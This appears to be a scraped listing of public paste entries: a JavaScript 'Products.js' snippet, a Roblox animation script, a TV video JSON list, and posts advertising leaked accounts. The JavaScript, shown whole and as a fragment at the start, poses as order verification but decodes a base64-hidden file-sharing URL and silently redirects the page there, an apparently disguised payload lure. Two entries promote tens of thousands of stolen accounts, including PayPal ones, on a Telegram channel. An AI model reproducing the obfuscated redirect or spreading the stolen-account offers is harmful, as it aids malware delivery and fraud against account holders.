  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
StucXMun,PayPal with Balance,Epiphemeral,JavaScript,Friday 2nd of May 2025 03:54:32 AM CDT,80053 Accounts Posted On https://t.me/leakzbyeminem
Eren3QWf,Products.js,kammex,JavaScript,Friday 2nd of May 2025 03:54:29 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/31271/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fSgbvfC7,tv 05-2025 task,spidersam,JSON,Friday 2nd of May 2025 03:47:33 AM CDT,"[
   {
    ""name"": ""ZooTv-Live-01-05-2025"",
    ""url"": ""https://app.talkshoe.com/drive_files/download/67a0d2ad-6fee-4dfa-bc17-6f0b99e01e2e.mp4"",
    ""imageUrl"": ""https://i.imgur.com/JxTvPB7.jpeg""  
   },
   {
    ""name"": ""ZooTv-Live-02-05-2025"",
    ""url"": """",
    ""imageUrl"": ""https://i.imgur.com/JxTvPB7.jpeg""  
   }
]"
Lf75e7Kd,ROBLOX Classic Animations + Classic NPC,AutumnMoon88683,Lua,Friday 2nd of May 2025 03:43:53 AM CDT,"local classic = true

local function Main()
	Connection = game.Workspace.DescendantAdded:Connect(function(c)
		if c.Name == ""Animate"" then
			c.Disabled=true        
		end
	end)
	repeat wait() until game.Players.LocalPlayer.Character
	Char = c
	Died = game.Players.LocalPlayer.Character:WaitForChild(""Humanoid"").Died:Connect(function()
		Connection:Disconnect()
		Died:Disconnect()
	end)
	wait(.1)
	function waitForChild(parent, childName)
		local child = parent:findFirstChild(childName)
		if child then return child end
		while true do
			child = parent.ChildAdded:wait()
			if child.Name==childName then return child end
		end
	end

	-- ANIMATION

	-- declarations

	local Figure = game.Players.LocalPlayer.Character
	local Torso = waitForChild(Figure, ""Torso"")
	local RightShoulder = waitForChild(Torso, ""Right Shoulder"")
	local LeftShoulder = waitForChild(Torso, ""Left Shoulder"")
	local RightHip = waitForChild(Torso, ""Right Hip"")
	local LeftHip = waitForChild(Torso, ""Left Hip"")
	local Neck = waitForChild(Torso, ""Neck"")
	local Humanoid = waitForChild(Figure, ""Humanoid"")
	local pose = ""Standing""

	local toolAnim = ""None""
	local toolAnimTime = 0

	local jumpMaxLimbVelocity = 0.75

	-- functions

	function onRunning(speed)
		if speed > 0.1 then
			pose = ""Running""
		else
			pose = ""Standing""
		end
	end

	function onDied()
		pose = ""Dead""
	end

	function onJumping()
		pose = ""Jumping""
	end

	function onClimbing()
		pose = ""Climbing""
	end

	function onGettingUp()
		pose = ""GettingUp""
	end

	function onFreeFall()
		pose = ""FreeFall""
	end

	function onFallingDown()
		pose = ""FallingDown""
	end

	function onSeated()
		pose = ""Seated""
	end

	function onPlatformStanding()
		pose = ""PlatformStanding""
	end

	function onSwimming(speed)
		if speed>0 then
			pose = ""Running""
		else
			pose = ""Standing""
		end
	end

	function moveJump()
		RightShoulder.MaxVelocity = jumpMaxLimbVelocity
		LeftShoulder.MaxVelocity = jumpMaxLimbVelocity
		RightShoulder:SetDesiredAngle(3.14)
		LeftShoulder:SetDesiredAngle(-3.14)
		RightHip:SetDesiredAngle(0)
		LeftHip:SetDesiredAngle(0)
	end


	-- same as jump for now

	function moveFreeFall()
		RightShoulder.MaxVelocity = jumpMaxLimbVelocity
		LeftShoulder.MaxVelocity = jumpMaxLimbVelocity
		RightShoulder:SetDesiredAngle(3.14)
		LeftShoulder:SetDesiredAngle(-3.14)
		RightHip:SetDesiredAngle(0)
		LeftHip:SetDesiredAngle(0)
	end

	function moveSit()
		RightShoulder.MaxVelocity = 0.15
		LeftShoulder.MaxVelocity = 0.15
		RightShoulder:SetDesiredAngle(3.14 /2)
		LeftShoulder:SetDesiredAngle(-3.14 /2)
		RightHip:SetDesiredAngle(3.14 /2)
		LeftHip:SetDesiredAngle(-3.14 /2)
	end

	function getTool()
		for _, kid in ipairs(Figure:GetChildren()) do
			if kid.className == ""Tool"" then return kid end
		end
		return nil
	end

	function getToolAnim(tool)
		for _, c in ipairs(tool:GetChildren()) do
			if c.Name == ""toolanim"" and c.className == ""StringValue"" then
				return c
			end
		end
		return nil
	end

	function animateTool()

		if (toolAnim == ""None"") then
			RightShoulder:SetDesiredAngle(1.57)
			return
		end

		if (toolAnim == ""Slash"") then
			RightShoulder.MaxVelocity = 0.5
			RightShoulder:SetDesiredAngle(0)
			return
		end

		if (toolAnim == ""Lunge"") then
			RightShoulder.MaxVelocity = 0.5
			LeftShoulder.MaxVelocity = 0.5
			RightHip.MaxVelocity = 0.5
			LeftHip.MaxVelocity = 0.5
			RightShoulder:SetDesiredAngle(1.57)
			LeftShoulder:SetDesiredAngle(1.0)
			RightHip:SetDesiredAngle(1.57)
			LeftHip:SetDesiredAngle(1.0)
			return
		end
	end

	function move(time)
		local amplitude
		local frequency

		if (pose == ""Jumping"") then
			moveJump()
			return
		end

		if (pose == ""FreeFall"") then
			moveFreeFall()
			return
		end

		if (pose == ""Seated"") then
			moveSit()
			return
		end

		local climbFudge = 0

		if (pose == ""Running"") then
			if (RightShoulder.CurrentAngle > 1.5 or RightShoulder.CurrentAngle < -1.5) then
				RightShoulder.MaxVelocity = jumpMaxLimbVelocity
			else  
				RightShoulder.MaxVelocity = 0.15
			end
			if (LeftShoulder.CurrentAngle > 1.5 or LeftShoulder.CurrentAngle < -1.5) then
				LeftShoulder.MaxVelocity = jumpMaxLimbVelocity
			else  
				LeftShoulder.MaxVelocity = 0.15
			end
			amplitude = 1
			frequency = 9
		elseif (pose == ""Climbing"") then
			RightShoulder.MaxVelocity = 0.5
			LeftShoulder.MaxVelocity = 0.5
			amplitude = 1
			frequency = 9
			climbFudge = 3.14
		else
			amplitude = 0.1
			frequency = 1
		end

		desiredAngle = amplitude * math.sin(time*frequency)

		RightShoulder:SetDesiredAngle(desiredAngle + climbFudge)
		LeftShoulder:SetDesiredAngle(desiredAngle - climbFudge)
		RightHip:SetDesiredAngle(-desiredAngle)
		LeftHip:SetDesiredAngle(-desiredAngle)


		local tool = getTool()

		if tool then

			animStringValueObject = getToolAnim(tool)

			if animStringValueObject then
				toolAnim = animStringValueObject.Value
				-- message recieved, delete StringValue
				animStringValueObject.Parent = nil
				toolAnimTime = time + .3
			end

			if time > toolAnimTime then
				toolAnimTime = 0
				toolAnim = ""None""
			end

			animateTool()


		else
			toolAnim = ""None""
			toolAnimTime = 0
		end
	end


	-- connect events

	Humanoid.Died:connect(onDied)
	Humanoid.Running:connect(onRunning)
	Humanoid.Jumping:connect(onJumping)
	Humanoid.Climbing:connect(onClimbing)
	Humanoid.GettingUp:connect(onGettingUp)
	Humanoid.FreeFalling:connect(onFreeFall)
	Humanoid.FallingDown:connect(onFallingDown)
	Humanoid.Seated:connect(onSeated)
	Humanoid.PlatformStanding:connect(onPlatformStanding)
	Humanoid.Swimming:connect(onSwimming)
	-- main program

	local runService = game:service(""RunService"");

	while Figure.Parent ~= nil do
		local _, time = wait(0.1)
		move(time)
	end
end

game.Players.LocalPlayer.CharacterAdded:Connect(function(c)
	if classic then
		coroutine.wrap(Main)()
	end
end)

local bot = false
local d = game:GetService(""UserInputService"")

d.InputBegan:Connect(function(c,v)
	if v then
		return
	else		
		if c.KeyCode == Enum.KeyCode.KeypadFive then
			bot = not bot
			print(""ClassicBotMode:""..tostring(bot))
		elseif c.KeyCode == Enum.KeyCode.KeypadSix then
			classic = not classic
			print(""ClassicAnims:""..tostring(classic))	
			
		end	
	end
end)

while wait() do
	if bot then
		local c = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
		wait(math.random(1,7))
		if math.random(1,5) > 2.5 then
			c:FindFirstChild(""Humanoid"").Jump = true
		end
		c:FindFirstChild(""Humanoid"").WalkToPoint = Vector3.new(math.random(1,2),math.random(1,2),math.random(1,2))
	end
end"
b57hjNEA,Leaked Accounts - Fresh Hits,Epiphemeral,JavaScript,Friday 2nd of May 2025 03:39:11 AM CDT,97780 Accounts Posted On https://t.me/leakzbyeminem
